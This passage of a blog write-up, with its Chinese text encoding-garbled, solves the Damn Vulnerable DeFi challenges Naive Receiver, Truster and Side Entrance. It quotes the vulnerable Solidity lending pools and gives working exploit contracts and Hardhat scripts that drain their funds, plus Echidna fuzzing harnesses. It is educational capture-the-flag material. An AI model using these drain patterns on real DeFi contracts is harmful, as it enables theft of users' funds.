<span class="w">    </span><span class="nx">address</span><span class="p">,</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">fee</span><span class="p">,</span>
<span class="w">    </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span>
<span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// gas savings</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">iszero</span><span class="p">(</span><span class="nx">eq</span><span class="p">(</span><span class="nx">sload</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">slot</span><span class="p">),</span><span class="w"> </span><span class="nx">caller</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">mstore</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48f5c3ed</span><span class="p">)</span>
<span class="w">            </span><span class="nx">revert</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">ETH</span><span class="p">)</span><span class="w"> </span><span class="nx">revert</span><span class="w"> </span><span class="nx">UnsupportedCurrency</span><span class="p">();</span>

<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountToBeRepaid</span><span class="p">;</span>
<span class="w">    </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">amountToBeRepaid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">fee</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">_executeActionDuringFlashLoan</span><span class="p">();</span>

<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransferETH</span><span class="p">(</span><span class="nx">pool</span><span class="p">,</span><span class="w"> </span><span class="nx">amountToBeRepaid</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">NaiveReceiverHacker</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">ETH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">pool</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">IERC3156FlashLender</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span>
<span class="w">                </span><span class="nx">IERC3156FlashBorrower</span><span class="p">(</span><span class="nx">receiver</span><span class="p">),</span><span class="w"> </span><span class="c1">// receiver</span>
<span class="w">                </span><span class="nx">ETH</span><span class="p">,</span><span class="w">                             </span><span class="c1">// token</span>
<span class="w">                </span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w">                         </span><span class="c1">// amount</span>
<span class="w">                </span><span class="s2">&quot;&quot;</span><span class="w">                               </span><span class="c1">// data</span>
<span class="w">            </span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s2">&quot;NaiveReceiverHacker&quot;</span><span class="p">)).</span><span class="nx">deploy</span><span class="p">();</span>
<span class="w">    </span><span class="c1">// or use ethers.deployContract(&quot;NaiveReceiverHacker&quot;). However, hardhat-ethers(hardhat-toolbox) is not included in the package.json</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">hacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">receiver</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
<h3 id="using-echidna_1">Using Echidna<a class="headerlink" href="#using-echidna_1" title="Permanent link">&para;</a></h3>
<div class="admonition note">
<p class="admonition-title">contracts/naive-receiver/NaiveReceiverTest.sol</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./FlashLoanReceiver.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">NaiveReceiverTest</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">NaiveReceiverLenderPool</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
<span class="w">    </span><span class="nx">FlashLoanReceiver</span><span class="w"> </span><span class="nx">receiver</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">NaiveReceiverLenderPool</span><span class="p">();</span>
<span class="w">        </span><span class="nx">receiver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FlashLoanReceiver</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">));</span>

<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">)).</span><span class="nx">transfer</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">receiver</span><span class="p">)).</span><span class="nx">transfer</span><span class="p">(</span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Invariant: the balance of the receiver contract can not decrease</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">echidna_test_balance</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">receiver</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">naive-receiver.yml</p>
<div class="highlight"><pre><span></span><code>balanceContract: 10000000000000000000000 # 10000 ether
# Multi ABI: performing direct calls to every contract
allContracts: true  # multi-abi was renamed in echidna &gt;= 2.1
</code></pre></div>
</div>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>echidna<span class="w"> </span>.<span class="w"> </span>--contract<span class="w"> </span>NaiveReceiverTest<span class="w"> </span>--config<span class="w"> </span>naive-receiver.yml
...
echidna_test_balance:<span class="w"> </span>failed!üí•<span class="w">  </span>
<span class="w">  </span>Call<span class="w"> </span>sequence:
<span class="w">    </span>flashLoan<span class="o">(</span>0x62d69f6867a0a084c6d313943dc22023bc263691,0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,30,<span class="s2">&quot;ERC20: insufficient allowance&quot;</span><span class="o">)</span>


Unique<span class="w"> </span>instructions:<span class="w"> </span><span class="m">1553</span>
Unique<span class="w"> </span>codehashes:<span class="w"> </span><span class="m">4</span>
Corpus<span class="w"> </span>size:<span class="w"> </span><span class="m">8</span>
Seed:<span class="w"> </span><span class="m">8140429313308935610</span>
</code></pre></div>
<details class="tip">
<summary>ERROR:CryticCompile:Unknown file: contracts/hardhat-dependency-compiler/@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol</summary>
<p>Comment out <code>dependencyCompiler</code> in <code>hardhat.config.js</code>.</p>
</details>
<details class="tip">
<summary>echidna: Error running slither:</summary>
<p>Update Slither to the latest version.</p>
</details>
<h3 id="_2">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://github.com/crytic/echidna/wiki/How-to-use-Echidna-with-multiple-contracts">How to use Echidna with multiple contracts ¬∑ crytic/echidna Wiki</a></li>
<li><a href="https://secure-contracts.com/program-analysis/echidna/basic/common-testing-approaches.html#external-testing">External testing</a></li>
</ul>
<h2 id="3-truster">3. Truster<a class="headerlink" href="#3-truster" title="Permanent link">&para;</a></h2>
<blockquote>
<p>The pool holds 1 million DVT tokens. You have nothing.</p>
<p>To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.</p>
</blockquote>
<ul>
<li>
<p><code>target.functionCall(data)</code> ÂèØ‰ª•‰ª• <code>TrusterLenderPool</code> ÁöÑË∫´‰ªΩË∞ÉÁî®‰ªªÊÑèÂêàÁ∫¶ÁöÑ‰ªªÊÑèÂáΩÊï∞</p>
<div class="highlight"><pre><span></span><code><span class="c1">// TrusterLenderPool.sol</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">borrower</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>
<span class="w">    </span><span class="nx">external</span>
<span class="w">    </span><span class="nx">nonReentrant</span>
<span class="w">    </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>

<span class="w">    </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">borrower</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">target</span><span class="p">.</span><span class="nx">functionCall</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="p">)</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">RepayFailed</span><span class="p">();</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÈÇ£Â∞±ÊéàÊùÉ <code>player</code> ‰ΩøÁî® DVT Â•Ω‰∫ÜÔºÅ(Œ¶ÀãœâÀäŒ¶)</p>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">abi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;function approve(address spender, uint256 amount)&quot;</span><span class="p">];</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">iface</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">Interface</span><span class="p">(</span><span class="nx">abi</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">pool</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span>
<span class="w">        </span><span class="mf">0</span><span class="p">,</span>
<span class="w">        </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
<span class="w">        </span><span class="nx">iface</span><span class="p">.</span><span class="nx">encodeFunctionData</span><span class="p">(</span><span class="s2">&quot;approve&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span>
<span class="w">            </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
<span class="w">            </span><span class="nx">TOKENS_IN_POOL</span>
<span class="w">        </span><span class="p">]),</span>
<span class="w">    </span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">TOKENS_IN_POOL</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
</li>
</ul>
<h3 id="_3">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010">encodeABI to get call data with encoded parameters of contract method ¬∑ Issue #478 ¬∑ ethers-io/ethers.js</a></li>
</ul>
<h2 id="4-side-entrance">4. Side Entrance<a class="headerlink" href="#4-side-entrance" title="Permanent link">&para;</a></h2>
<blockquote>
<p>A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.</p>
<p>It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p>
<p>Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.</p>
</blockquote>
<ul>
<li><code>flashLoan()</code> Ê£ÄÊü•ÂÄüË¥∑ÂâçÂêé <code>SideEntranceLenderPool</code> ÁöÑ‰ΩôÈ¢ùÔºåËÄå <code>deposit</code> ËÉΩÂ§üÂ¢ûÂä†ÂÖ∂‰ΩôÈ¢ùÂπ∂‰∏∫ <code>msg.sender</code> ËÆ∞Ë¥¶</li>
<li>ÂèØÂú® <code>flashLoan()</code> Êó∂ <code>deposit()</code>ÔºåÁªìÊùüÂêé <code>withdraw()</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SideEntranceLenderPool.sol</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Deposit</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>

<span class="w">    </span><span class="ow">delete</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Withdraw</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>

<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransferETH</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>

<span class="w">    </span><span class="nx">IFlashLoanEtherReceiver</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">execute</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">amount</span><span class="p">}();</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="p">)</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">RepayFailed</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SideEntranceLenderPool.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SideEntranceHacker</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IFlashLoanEtherReceiver</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">SideEntranceLenderPool</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SideEntranceLenderPool</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s1">&#39;SideEntranceHacker&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">)).</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">hacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">();</span>
<span class="p">});</span>
</code></pre></div>
<h3 id="using-echidna_2">Using Echidna<a class="headerlink" href="#using-echidna_2" title="Permanent link">&para;</a></h3>
<div class="admonition note">
<p class="admonition-title">contracts/side-entrance/SideEntranceTest.sol</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SideEntranceLenderPool.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">PoolDeployer</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// SideEntranceTest contract should not be the owner of the initial funds,</span>
<span class="w">    </span><span class="c1">// or it can remove the funds by calling withdraw()</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deploy</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">SideEntranceLenderPool</span><span class="w"> </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SideEntranceLenderPool</span><span class="p">();</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SideEntranceTest</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IFlashLoanEtherReceiver</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">SideEntranceLenderPool</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>

<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canWithdraw</span><span class="p">;</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canDeposit</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">depositAmount</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">PoolDeployer</span><span class="w"> </span><span class="nx">deployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">PoolDeployer</span><span class="p">();</span>
<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SideEntranceLenderPool</span><span class="p">(</span><span class="nx">deployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}());</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setWithdraw</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">canWithdraw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDeposit</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">canDeposit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
<span class="w">        </span><span class="nx">depositAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

